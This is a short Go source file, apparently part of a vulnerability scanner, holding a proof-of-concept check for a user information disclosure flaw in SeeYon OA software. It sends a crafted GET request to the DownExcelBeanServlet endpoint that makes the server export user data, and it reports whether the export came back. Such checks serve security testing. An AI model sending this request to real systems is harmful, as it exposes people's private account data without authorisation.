package seeyon

import "github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"

// DownExcelBeanServlet 用户敏感信息泄露

func DownExcelBeanServlet(u string, client *httpx.Client) bool {
	if req, err := client.Request(u+"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0", "GET", "", nil, "Poc SeeYon"); err == nil {
		if req.StatusCode == 200 && req.RespHeader.Get("Content-disposition") != "" {
			return true
		}
	}
	return false
}
